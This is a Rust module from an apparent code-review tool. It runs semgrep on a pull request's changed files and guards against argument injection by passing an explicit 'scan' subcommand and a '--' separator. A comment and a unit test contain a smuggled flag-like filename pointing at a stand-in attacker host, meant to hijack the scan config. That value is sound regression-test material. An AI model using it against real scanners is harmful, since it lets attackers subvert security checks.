use std::path::PathBuf;
use std::process::Command;

/// If semgrep is on PATH, run it against the changed files and convert the output into
/// deterministic_results form. Returns None if it's missing or execution/parsing fails — the
/// caller falls back to the existing NOT_RUN path (never fabricates a guessed result).
/// dependency_sca/dataflow_taint/api_deprecation are left untouched (stay NOT_RUN) since the
/// default `--config=auto` ruleset alone can't cover them.
/// `changed_files` is a value fully controlled by the author of the PR under review — if a file
/// path starts with `-` (e.g. an actual file named `--config=http://attacker.example/evil.yml`)
/// and is passed through without a `--` separator, semgrep's own argument parser can mistake it
/// for a flag, letting an attacker override the scan config (ruleset source, etc.). `--` pins
/// everything after it as positional arguments.
///
/// Verified against the actual semgrep 1.172.0 binary: if the `scan` subcommand isn't specified
/// explicitly (relying on semgrep's "treat missing subcommand as scan" convenience feature) and
/// only `--` is added, `--` gets silently ignored and a filename starting with `--config=` still
/// gets parsed as a flag (apparently because Click's top-level group doesn't correctly forward
/// `--` when delegating to the default command) — `semgrep --config=auto --json --quiet --
/// <malicious-filename>` gets through unblocked. Specifying `scan` explicitly
/// (`semgrep scan --config=auto ... -- <file>`) makes everything after `--` get treated exactly
/// as positional arguments. The previous fix (just adding `--`) was ineffective on this
/// missing-subcommand path.
fn build_args<'a>(existing: &[&'a str]) -> Vec<&'a str> {
    let mut args = vec!["scan", "--config=auto", "--json", "--quiet", "--"];
    args.extend_from_slice(existing);
    args
}

pub fn try_run(changed_files: &[String]) -> Option<serde_json::Value> {
    let bin = which("semgrep")?;
    let existing: Vec<&str> = changed_files
        .iter()
        .map(|s| s.as_str())
        .filter(|f| std::path::Path::new(f).exists())
        .collect();
    if existing.is_empty() {
        return None;
    }

    let output = Command::new(&bin)
        .args(build_args(&existing))
        .output()
        .ok()?;
    let v: serde_json::Value = serde_json::from_slice(&output.stdout).ok()?;
    let results = v.get("results")?.as_array()?;
    let has_findings = !results.is_empty();
    let secrets_hit = results.iter().any(|r| {
        r.get("check_id")
            .and_then(|c| c.as_str())
            .map(|c| c.contains("secret") || c.contains("hardcoded"))
            .unwrap_or(false)
    });

    Some(serde_json::json!({
        "sast": {
            "status": if has_findings { "fail" } else { "pass" },
            "evidence": format!("semgrep --config=auto 자동 실행: {} findings", results.len()),
        },
        "secrets": {
            "status": if secrets_hit { "fail" } else { "pass" },
            "evidence": "semgrep --config=auto 결과 기반 — 전용 secrets 스캐너 아니므로 참고용",
        },
    }))
}

fn which(bin: &str) -> Option<PathBuf> {
    let path = std::env::var_os("PATH")?;
    std::env::split_paths(&path).find_map(|dir| find_executable(&dir, bin))
}

/// `is_file()` alone isn't enough — on Unix, files without the executable permission bit would
/// pass this check (and only fail at spawn time), while on Windows, semgrep is typically
/// installed as "semgrep.exe"/"semgrep.cmd" rather than extension-less "semgrep", so it wouldn't
/// be found at all without checking PATHEXT. If both fail, semgrep silently falls through to
/// NOT_RUN even when it's actually present.
#[cfg(unix)]
fn find_executable(dir: &std::path::Path, bin: &str) -> Option<PathBuf> {
    use std::os::unix::fs::PermissionsExt;
    let full = dir.join(bin);
    let meta = full.metadata().ok()?;
    if meta.is_file() && meta.permissions().mode() & 0o111 != 0 {
        Some(full)
    } else {
        None
    }
}

#[cfg(windows)]
fn find_executable(dir: &std::path::Path, bin: &str) -> Option<PathBuf> {
    let exact = dir.join(bin);
    if exact.is_file() {
        return Some(exact);
    }
    let pathext = std::env::var("PATHEXT").unwrap_or_else(|_| ".EXE;.CMD;.BAT;.COM".to_string());
    pathext.split(';').find_map(|ext| {
        let candidate = dir.join(format!("{bin}{ext}"));
        candidate.is_file().then_some(candidate)
    })
}

#[cfg(not(any(unix, windows)))]
fn find_executable(dir: &std::path::Path, bin: &str) -> Option<PathBuf> {
    let full = dir.join(bin);
    full.is_file().then_some(full)
}

#[cfg(all(test, unix))]
mod tests {
    use super::*;
    use std::os::unix::fs::PermissionsExt;

    fn temp_dir(name: &str) -> std::path::PathBuf {
        let dir = std::env::temp_dir().join(format!("codereview-loop-semgrep-which-{name}"));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        dir
    }

    #[test]
    fn find_executable_rejects_non_executable_file() {
        let dir = temp_dir("non-exec");
        let bin_path = dir.join("semgrep");
        std::fs::write(&bin_path, "#!/bin/sh\n").unwrap();
        std::fs::set_permissions(&bin_path, std::fs::Permissions::from_mode(0o644)).unwrap();

        assert!(find_executable(&dir, "semgrep").is_none());

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn find_executable_accepts_executable_file() {
        let dir = temp_dir("exec");
        let bin_path = dir.join("semgrep");
        std::fs::write(&bin_path, "#!/bin/sh\n").unwrap();
        std::fs::set_permissions(&bin_path, std::fs::Permissions::from_mode(0o755)).unwrap();

        assert_eq!(find_executable(&dir, "semgrep"), Some(bin_path));

        let _ = std::fs::remove_dir_all(&dir);
    }
}

#[cfg(test)]
mod build_args_tests {
    use super::*;

    #[test]
    fn build_args_starts_with_explicit_scan_subcommand() {
        // Verified against the actual semgrep binary: relying on subcommand omission (implicit
        // scan) causes -- to be silently ignored — scan must be explicit for -- to actually work.
        let args = build_args(&["src/main.rs"]);
        assert_eq!(args[0], "scan");
    }

    #[test]
    fn build_args_places_separator_before_file_list() {
        let existing = vec!["src/main.rs", "src/lib.rs"];
        let args = build_args(&existing);
        let sep = args
            .iter()
            .position(|a| *a == "--")
            .expect("-- separator missing");
        assert!(
            args[1..sep].iter().all(|a| a.starts_with('-')),
            "scan 다음부터 -- 전까지는 전부 실제 플래그여야 함"
        );
        assert_eq!(&args[sep + 1..], existing.as_slice());
    }

    #[test]
    fn build_args_keeps_flag_like_filename_as_positional() {
        // Case where an actual filename created by the PR looks like a flag — if it's after --,
        // semgrep must interpret it only as a positional argument (prevents config hijacking via parser confusion).
        let existing = vec!["--config=http://attacker.example/evil.yml"];
        let args = build_args(&existing);
        let sep = args.iter().position(|a| *a == "--").unwrap();
        assert_eq!(&args[sep + 1..], existing.as_slice());
    }
}
